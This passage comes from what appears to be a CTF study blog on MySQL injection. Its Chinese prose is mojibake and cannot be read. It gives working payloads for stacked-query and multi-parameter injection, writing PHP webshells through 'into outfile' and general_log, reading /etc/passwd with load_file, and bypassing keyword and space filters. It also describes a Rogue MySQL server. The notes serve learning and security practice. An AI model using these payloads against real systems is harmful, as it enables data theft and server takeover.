class="operator">|</span> root     <span class="operator">|</span> root   <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> you      <span class="operator">|</span> you      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">6</span> <span class="operator">|</span> run      <span class="operator">|</span> run      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">6</span> warnings (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>selectä¸ç”¨åœ¨ä¹å­—æ®µæ•°</p>
</blockquote>
<h3 id="è¿›é˜¶">3.7.1. || è¿›é˜¶</h3>
<p>å‘½ä»¤:<code>set sql_mode=pipes_as_concat</code>ä¼šä½¿ '||'å¤±å»â€˜æˆ–â€™çš„ä½œç”¨ï¼Œè€Œå˜æˆå­—ç¬¦ä¸²è¿æ¥ç¬¦ã€‚å› æ­¤å½“æˆ‘ä»¬è¾“å…¥åœ¨æ•°æ®åº“ä¸­è¾“å…¥æŸ¥è¯¢è¯­å¥<code>select 1||column_name from table_name</code>æ—¶ï¼Œä¼šæ˜¾ç¤ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span>username <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span><span class="operator">||</span>username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>admin      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>root       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>hdf        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>xioazz     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>you        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>run        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>æ˜¾ç¤ºçš„å€¼ä¸º1å’Œusernameçš„å€¼æ‹¼æ¥ä¹‹åçš„ç»“æœã€‚å› æ­¤ï¼Œæœ¬é¢˜ä¸­å¯ä»¥æ„é€ è¿™æ ·çš„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=1;set sql_mode=pipes_as_concat;select 1(ä»»æ„æ•°å­—)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426223917.png" /></p>
<p>è¿™æ ·ä¼šæŸ¥æ‰¾ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æŸ¥æ‰¾<code>select 1</code>ï¼Œç¬¬äºŒæ¬¡æŸ¥æ‰¾<code>select 1||flag from Flag</code>ï¼Œä¸­é—´åšäº†è®¾ç½®ï¼Œä½¿'||'ä½œç”¨å˜ä¸ºå­—ç¬¦ä¸²è¿æ¥ç¬¦ã€‚å› æ­¤å¾—åˆ°ä¸¤æ¬¡ç»“æœï¼š</p>
<h2 id="update-inset-intoæ³¨å…¥">3.8. update, inset intoæ³¨å…¥</h2>
<p>è¿™ä¸¤ä¸ªæ³¨å…¥éƒ½æ˜¯ä¸å›æ˜¾çš„ã€‚updateçš„ä½œç”¨æ˜¯æ›´æ”¹ä¿¡æ¯ï¼›è€Œinsert intoçš„ä½œç”¨æ˜¯æ’å…¥æ–°çš„æ•°æ®ã€‚</p>
<p>è¿™é‡Œéœ€è¦æä¸€ä¸‹updateçš„ä¸€ä¸ªç‰¹ç‚¹ï¼š<strong>updateå¯ä»¥å°†åŒä¸€ä¸ªè¡¨å†…çš„ä¸€ä¸ªå­—æ®µçš„å€¼èµ‹å€¼ç»™å¦ä¸€ä¸ªå­—æ®µ</strong>ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
<p>ä¸Šè¿°è¯­å¥ä¼šå°†å­—æ®µ4çš„å€¼èµ‹ç»™å­—æ®µ2ã€‚</p>
<h2 id="å¤šå‚æ•°æ³¨å…¥">3.9. å¤šå‚æ•°æ³¨å…¥</h2>
<p>æ²¡æœ‰é‡åˆ°è¿‡å®é™…é¢˜ç›®ï¼Œåœ¨è¿™é‡Œè¯´æ˜ä¸€ä¸‹åŸç†ã€‚</p>
<p>å‡è®¾åå°è¯­å¥å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span>&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p>å…¶ä¸­ $uname å’Œ $passwd ä¸ºç”¨æˆ·è¾“å…¥ã€‚å‡å¦‚æˆ‘ä»¬è¾“å…¥å¦‚ä¸‹payload: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?uname=1union/*&amp;passwd=*/select * from users</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆæœ€ç»ˆçš„åå°è¯­å¥ä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=1 union/* and password = */select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=1 union select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">+------+----------+----------+--------+</span><br><span class="line">| id   | username | password | camp   |</span><br><span class="line">+------+----------+----------+--------+</span><br><span class="line">|    <span class="number">1</span> | admin    | admin    | admin  |</span><br><span class="line">|    <span class="number">2</span> | root     | root     | root   |</span><br><span class="line">|    <span class="number">3</span> | hdf      | hdf      | common |</span><br><span class="line">|    <span class="number">4</span> | xioazz   | xiozz    | common |</span><br><span class="line">|    <span class="number">5</span> | you      | you      | common |</span><br><span class="line">|    <span class="number">6</span> | run      | run      | common |</span><br><span class="line">+------+----------+----------+--------+</span><br></pre></td></tr></table></figure></p>
<h2 id="åˆ©ç”¨mysqlå†™å…¥æ–‡ä»¶">3.10. åˆ©ç”¨MySQLå†™å…¥æ–‡ä»¶</h2>
<h3 id="select-..-into-outfileinto-dumpfile">3.10.1. select .. into outfile/into dumpfile</h3>
<p>è¯­æ³•å¦‚ä¸‹ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">seleect content <span class="keyword">into</span> outfile <span class="string">&#x27;filePath&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>æµ‹è¯• <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\test.txt&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">6</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427103611.png" /></p>
<p>æˆåŠŸå°†æ•°æ®å¯¼å…¥ï¼Œå› æ­¤ï¼Œå¯ä»¥è¿™ä¹ˆåˆ©ç”¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#x27;&lt;?php phpinfo();?&gt;&#x27;from users into outfile &#x27;D:\\shell.txt&#x27;;</span><br><span class="line">Query OK, 6 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427103735.png" /></p>
<p>åªéœ€è¦æŠŠä¸­é—´çš„å†…å®¹æ”¹æˆä¸€å¥è¯å³å¯ã€‚ï¼ˆdumpfileä¹Ÿæ˜¯ä¸€æ ·çš„è¯­æ³•ï¼‰</p>
<h3 id="secure_file_priv">3.10.2. secure_file_priv</h3>
<p>æœ‰æ—¶å€™ï¼Œåœ¨å†™å…¥æ—¶å¯èƒ½ä¼šæŠ¥é”™ï¼Œ<code>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p>
<p>è¿™æ˜¯å› ä¸ºMySQLä¸­çš„secure_file_privçš„å€¼ä¼šå¯¹è¯»å†™æ–‡ä»¶é€ æˆä¸€å®šçš„å½±å“ã€‚å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure></p>
<p>è¯´æ˜ï¼š</p>
<ol type="1">
<li>å½“å€¼ä¸º NULL æ—¶ï¼Œè¡¨ç¤ºMySQLä¸å…è®¸å¯¼å…¥/å¯¼å‡º</li>
<li>å½“å€¼ä¸ºæŸä¸€å…·ä½“è·¯å¾„æ—¶ï¼Œè¡¨ç¤ºMySQLåªèƒ½å¤Ÿå¯¼å…¥åˆ°ç‰¹å®šè·¯å¾„ï¼›</li>
<li>å½“æ²¡æœ‰å€¼æ—¶ï¼Œåˆ™è¯´æ˜æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼›</li>
</ol>
<p>è€Œè¿™ä¸ªå˜é‡çš„å€¼æ— æ³•é€šè¿‡å‘½ä»¤è¿›è¡Œä¿®æ”¹ï¼Œåªèƒ½å¤Ÿä¿®æ”¹MySQLçš„é…ç½®æ–‡ä»¶mysql.iniã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427104643.png" /></p>
<p>ç›´æ¥ä¿®æ”¹å€¼å³å¯ã€‚ï¼ˆå¦‚æœæ²¡æœ‰è¿™ä¸ªå˜é‡ï¼Œå°±è‡ªå·±æ·»åŠ è¿™ä¹ˆä¸€è¡Œï¼‰</p>
<h3 id="åˆ©ç”¨æ—¥å¿—å†™å…¥">3.10.3. åˆ©ç”¨æ—¥å¿—å†™å…¥</h3>
<p>å½“secure_file_privçš„å€¼ä¸ºNULLæ—¶ï¼Œå¯ä»¥åˆ©ç”¨æ—¥å¿—è¿›è¡Œshellå†™å…¥ã€‚</p>
<p>é¦–å¸­æŸ¥çœ‹logçš„ä½ç½®ï¼Œ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general_log%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> D:\phpStudy2018\PHPTutorial\MySQL\data\HF <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------------------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>ä½¿ç”¨logå†™å…¥shellçš„æ–¹å¼ï¼š</p>
<ol type="1">
<li>å¼€å¯æ—¥å¿—è®°å½•ï¼šset global general_log='on';</li>
<li>å°†æ—¥å¿—æ–‡ä»¶å¯¼å‡ºåˆ°æŒ‡å®šç›®å½•ï¼šset global general_log_file='filePath';</li>
<li>æœ€åæ‰§è¡Œselectè¯­å¥ï¼Œä¾‹å¦‚ï¼šselect '<?php phpinfo();?>';</li>
</ol>
<p>æµ‹è¯•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;D://shelltest.php&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹ä½ å¯¹åº”çš„æ–‡ä»¶ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427105208.png" /></p>
<p>æˆåŠŸå†™å…¥ã€‚</p>
<h2 id="åˆ©ç”¨mysqlè¯»å–æ–‡ä»¶">3.11. åˆ©ç”¨MySQLè¯»å–æ–‡ä»¶</h2>
<h3 id="load_file">3.11.1. load_file()</h3>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;filePath&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<p>é˜²æ­¢æ–‡ä»¶ä¸­æœ‰éæ³•å­—ç¬¦ï¼Œå¯ä»¥å…ˆå°†å…¶ç¼–ç ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>));</span><br></pre></td></tr></table></figure></p>
<p>æµ‹è¯•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> load_file(<span class="string">&#x27;D://test.txt&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> load_file(<span class="string">&#x27;D://test.txt&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> hello world               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> hex(load_file(<span class="string">&#x27;D://test.txt&#x27;</span>));</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> hex(load_file(<span class="string">&#x27;D://test.txt&#x27;</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">68656</span>C6C6F20776F726C64         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸ªå‡½æ•°ä¹Ÿå—åˆ°[[#secure_file_priv]]çš„å½±å“ã€‚</p>
<h3 id="rogue-mysql-server">3.11.2. Rogue-MySQL-Server</h3>
<blockquote>
<p>å¾ˆæŠ½è±¡ï¼Œæ²¡æœ‰é‡åˆ°è¿‡</p>
</blockquote>
<p>ä¼ªé€ ä¸€ä¸ªæ¶æ„çš„MySQL Serverï¼Œåˆ©ç”¨<code>load data infile</code>è¿™ä¸€è¯­å¥çš„æ¼æ´å®ç°å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶è¯»å–ã€‚è¯¥è¯­å¥çš„åŠŸèƒ½æ˜¯ï¼šè¯»å–ä¸€ä¸ªæ–‡ä»¶å†…å®¹å¹¶æ’å…¥åˆ°è¡¨ä¸­</p>
<p><code>load data infile</code>è¯­å¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶çš„è¯­æ³•å¦‚ä¸‹ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">load data <span class="keyword">local</span> infile &quot;/tmp/test.csv&quot; <span class="keyword">into</span> <span class="keyword">table</span> test</span><br></pre></td></tr></table></figure></p>
<p>è¿™ä¸€è¯­å¥å‘é€æ‰§è¡Œåï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ­£å¸¸çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>Clientï¼šæˆ‘æŠŠæˆ‘æœ¬åœ°/tmp/test.csvçš„å†…å®¹æ’å…¥åˆ° test è¡¨ä¸­å»</li>
<li>Serverï¼šè¯·æŠŠä½ æœ¬åœ°/tmp/test.csvçš„å†…å®¹å‘é€ç»™æˆ‘</li>
<li>Clientï¼šå¥½çš„ï¼Œè¿™æ˜¯æˆ‘æœ¬åœ°/tmp/test.csvçš„å†…å®¹</li>
<li>Serverï¼šæˆåŠŸ/å¤±è´¥</li>
</ol>
<p>æ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªæµç¨‹æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†é—®é¢˜åœ¨äºå®¢æˆ·ç«¯å¹¶ä¸çŸ¥é“è‡ªå·±çš„ä¸Šä¸€æ¡å‘½ä»¤å…·ä½“å‘é€äº†ä»€ä¹ˆï¼Œæ‰€ä»¥å®¢æˆ·ç«¯ç¬¬äºŒæ¬¡è¦å‘é€ä»€ä¹ˆæ–‡ä»¶å®Œå…¨å–å†³äºæœåŠ¡ç«¯ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªæ¶æ„çš„æœåŠ¡ç«¯ï¼Œå°±å¯ä»¥éæ³•æ‹¿åˆ°æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶</p>
<p>å‚è€ƒï¼š</p>
<ul>
<li><a href="https://www.cnblogs.com/BOHB-yunying/p/10820453.html">MySQLæœåŠ¡ç«¯æ¶æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶æ¼æ´ (DDCTF2019å’Œå›½èµ›å‡æ¶‰åŠåˆ°è¿™ä¸ªæ¼æ´) - yunying - åšå®¢å›­</a></li>
<li><a href="https://blog.csdn.net/ls1120704214/article/details/88174003">MySQLæœåŠ¡ç«¯æ¶æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶æ¼æ´åˆ†æå¹¶ä½¿ç”¨Golangç¼–å†™ç®€æ˜“èœœç½_å­¤åŸæµªå­55555çš„åšå®¢-CSDNåšå®¢_mysqlå®¢æˆ·ç«¯æ¼æ´</a></li>
<li><a href="https://github.com/allyshka/Rogue-MySql-Server">GitHub - allyshka/Rogue-MySql-Server: MySQL fake server for read files of connected clients</a></li>
</ul>
<h1 id="bypass">4. Bypass</h1>
<h2 id="è¿‡æ»¤ç©ºæ ¼">4.1. è¿‡æ»¤ç©ºæ ¼</h2>
<p>ç©ºæ ¼çš„urlç¼–ç ä¸º: %20ã€‚å¯ä»¥åˆ©ç”¨ä¸€ä¸‹å­—ç¬¦çš„urlç¼–ç ç»•è¿‡ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**/æ›¿ä»£ç©ºæ ¼ </span><br><span class="line">%09 TAB é”®ï¼ˆæ°´å¹³ï¼‰</span><br><span class="line">%0a æ–°å»ºä¸€è¡Œ </span><br><span class="line">%0c æ–°çš„ä¸€é¡µ </span><br><span class="line">%0d return åŠŸèƒ½ </span><br><span class="line">%0b TAB é”®ï¼ˆå‚ç›´ï¼‰ </span><br><span class="line">%a0 ç©ºæ ¼ </span><br><span class="line">() ä»£æ›¿ç©ºæ ¼ï¼Œåœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸º%a0çš„ç‰¹æ€§ï¼Œåœ¨è¿›è¡Œæ­£åˆ™åŒ¹é…æ—¶ï¼ŒåŒ¹é…åˆ°å®ƒæ—¶æ˜¯è¯†åˆ«ä¸ºä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ä¸ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä½†æ˜¯åœ¨è¿›å…¥SQLè¯­å¥åï¼ŒMysqlæ˜¯ä¸è®¤ä¸­æ–‡å­—ç¬¦çš„ï¼Œæ‰€ä»¥ç›´æ¥å½“ä½œç©ºæ ¼å¤„ç†ï¼Œå°±è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿è¾¾æˆäº†Bypassçš„ç›®çš„ï¼ŒæˆåŠŸç»•è¿‡ç©ºæ ¼+æ³¨é‡Šçš„è¿‡æ»¤</p>
<p>åˆ©ç”¨æ‹¬å·ç»•è¿‡è¯·çœ‹[[#1 6 æ‹¬å·çš„é—®é¢˜]]</p>
<h2 id="è¿‡æ»¤å…³é”®å­—">4.2. è¿‡æ»¤å…³é”®å­—â­</h2>
<h3 id="å¤§å°å†™ç»•è¿‡">4.2.1. å¤§å°å†™ç»•è¿‡</h3>
<p>æ¡ä»¶ï¼šåå°è¿‡æ»¤äº†ä¸€äº›å…³é”®è¯ï¼Œä½†æ˜¯å¤§å°å†™æ•æ„Ÿã€‚</p>
<p>ä¸€èˆ¬payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; unIOn SeLecT 1,2,3,4,5#</span><br></pre></td></tr></table></figure></p>
<p>æ¯”å¦‚ä½¿ç”¨preg_matchå‡½æ•°æ—¶æ²¡æœ‰åŠ ä¸Š/iï¼Œé‚£ä¹ˆå°±æ˜¯å¤§å°å†™æ•æ„Ÿã€‚</p>
<h3 id="åŒå†™ç»•è¿‡">4.2.2. åŒå†™ç»•è¿‡</h3>
<p>æ¡ä»¶ï¼šåå°åœ¨æ‰¾åˆ°è¿‡æ»¤çš„å…³é”®è¯æ—¶ï¼Œä½¿ç”¨ç©ºå†…å®¹ä»£æ›¿ã€‚æ¯”å¦‚è¿™ä¹ˆä¸€ä¸ªè¯­å¥ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace(blacklist, &#x27;&#x27;, payload);</span><br></pre></td></tr></table></figure></p>
<p>å‡è®¾é»‘åå•ç§è¿‡æ»¤äº†selectï¼Œå¦‚æœpayloadä¸­æœ‰selselectectï¼Œé‚£ä¹ˆä¸­é—´çš„selectè¢«è¿‡æ»¤ï¼Œç”¨ç©ºå†…å®¹ä»£æ›¿ï¼Œé‚£ä¹ˆå‰©ä¸‹selectï¼Œè¿™å°±å®ç°äº†ç»•è¿‡ã€‚</p>
<h3 id="ç¼–ç ç»•è¿‡">4.2.3. ç¼–ç ç»•è¿‡</h3>
<p>åˆ©ç”¨urlencode(), ascii(char), hex(), unicode()ï¼Œ char()ç­‰ç¼–ç ç»•è¿‡ã€‚</p>
<p>å°±åƒ[[#3 4 äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥]]ä¸­æåˆ°çš„é‚£æ ·ï¼Œå°†payloadè¿›è¡Œç¼–ç ã€‚</p>
<p>ä½¿ç”¨urlç¼–ç çš„æ—¶å€™æœ‰æ—¶å€™éœ€è¦åŒé‡ç¼–ç ã€‚æ¯”å¦‚åå°å¦‚æœç¢°åˆ° %27 å°±ä¼šå½“ä½œå•å¼•å·ä»è€Œè¿‡æ»¤ï¼Œå¤§é‚£æ˜¯å¦‚æœæˆ‘ä»¬è¿›è¡ŒåŒé‡ç¼–ç ï¼Œå³ %2527 (%çš„urlç¼–ç ä¸º %25)ï¼Œé‚£ä¹ˆåå°è¯†åˆ«åˆ°çš„å°±æ˜¯%2527ï¼Œä¹Ÿå°±æˆåŠŸç»•è¿‡ã€‚<strong>é’ˆå¯¹åœ¨è¿‡æ»¤æ£€æŸ¥ä¹‹å‰è¿›è¡Œä¸€æ¬¡urlè§£ç çš„æƒ…å†µ</strong>ã€‚</p>
<h3 id="è¿‡æ»¤-if">4.2.4. è¿‡æ»¤ if</h3>
<p>å¦‚æœifè¢«è¿‡æ»¤äº†ï¼ŒæŒ‰ç…§ä¹‹å‰çš„æè¿°ï¼Œæ—¶é—´ç›²æ³¨å°†æ— æ³•ä½¿ç”¨ã€‚ä½†æ˜¯äº‹å®çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿå…¶å®å¯ä»¥è¿™ä¹ˆåš <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sleep(5*(condition))</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœconditionä¸ºçœŸï¼Œé‚£ä¹ˆæ­¤æ—¶æ‰§è¡Œsleep(5)ï¼Œå¦‚æœconditionä¸ºå‡ï¼Œæ­¤æ—¶æ‰§è¡Œsleep(0)ã€‚</p>
<h3 id="ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç»•è¿‡">4.2.5. ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç»•è¿‡</h3>
<p>è¿™ç§æ–¹æ³•é’ˆå¯¹çš„æ˜¯è¿‡æ»¤äº† or, and, xorã€‚</p>
<p>orå¯ä»¥ç”¨ || ä»£æ›¿ï¼›</p>
<p>and å¯ä»¥ç”¨ &amp;&amp; ä»£æ›¿ï¼›</p>
<p>xor å¯ä»¥ç”¨ ^ ä»£æ›¿ï¼›</p>
<p>not å¯ä»¥ç”¨ ! ä»£æ›¿ï¼›</p>
<h3 id="è¿‡æ»¤-select">4.2.6. è¿‡æ»¤ select</h3>
<p>å¯ä»¥ä½¿ç”¨handleræ¥æŸ¥è¯¢æ•°æ®ï¼Œå…·ä½“å¯ä»¥çœ‹[[#3 5 2 3 handler mysqlä¸“å±]]</p>
<p>å¦‚æœå®åœ¨æ— æ³•ç»•è¿‡ï¼Œå¯ä»¥è€ƒè™‘å †å æ³¨å…¥ã€‚</p>
<h3 id="è¿‡æ»¤äº†å­—ç¬¦ä¸²æˆªå–å‡½æ•°">4.2.7. è¿‡æ»¤äº†å­—ç¬¦ä¸²æˆªå–å‡½æ•°</h3>
<p>å¸¸ç”¨çš„substr(), substring(), mid()ç­‰è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<ul>
<li>left(str, len)</li>
<li>right(str, len)</li>
</ul>
